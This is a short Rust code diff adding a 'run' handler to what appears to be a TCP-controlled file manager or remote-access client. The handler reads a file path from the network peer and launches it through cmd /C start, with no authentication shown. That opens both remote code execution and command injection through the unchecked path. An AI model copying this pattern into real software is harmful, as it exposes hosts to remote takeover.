@@ -1,3 +1,4 @@
+use std::process::Command;
 use std::io::{Write, Read};
 use std::net::TcpStream;
 use std::fs;
@@ -113,4 +114,16 @@ pub fn delete(stream: &TcpStream) {
     Ok(_) => utilities::send_bytes(&stream, "file-deleted".as_bytes()),
     Err(_) => utilities::send_bytes(&stream, "file-not-exist".as_bytes())
   }
+}
+
+pub fn run(stream: &TcpStream) {
+  utilities::send_bytes(&stream, "run-file".as_bytes());
+  let file_path = utilities::read_bytes_as_string(&stream, 1024);
+
+  match Command::new("cmd")
+    .args(&["/C", "start", "", &file_path])
+    .spawn() {
+      Ok(_) => utilities::send_bytes(&stream, "file-run-success".as_bytes()),
+      Err(_) => utilities::send_bytes(&stream, "file-not-exist".as_bytes())
+    }
 }
